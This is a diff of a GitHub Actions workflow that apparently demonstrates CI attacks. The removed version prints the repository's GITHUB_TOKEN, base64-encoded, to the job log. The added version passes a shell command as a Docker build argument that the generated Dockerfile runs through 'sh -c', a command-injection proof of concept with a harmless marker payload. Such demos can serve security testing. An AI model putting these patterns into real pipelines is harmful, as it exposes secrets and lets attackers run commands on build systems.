@@ -1,16 +1,23 @@
-name: Leak GITHUB_TOKEN
-
-on: [push]
+name: Working RCE Demo
+on: push
 
 jobs:
-  leak:
+  test:
     runs-on: ubuntu-latest
     steps:
       - name: Checkout
         uses: actions/checkout@v2
 
-      - name: Dump GITHUB_TOKEN
+      - name: Build with malicious PYTHON_VERSION
         run: |
-          echo "TOKEN START"
-          echo "$GITHUB_TOKEN" | base64
-          echo "TOKEN END"
+          echo 'ARG PYTHON_VERSION
+          FROM alpine
+          RUN sh -c "$PYTHON_VERSION"' > Dockerfile
+
+          MALICIOUS_ARG="echo RCE_SUCCESS > /leak"
+
+          docker build \
+            --build-arg PYTHON_VERSION="$MALICIOUS_ARG" \
+            -t leak-check .
+
+          docker run --rm leak-check cat /leak || echo "No leak"
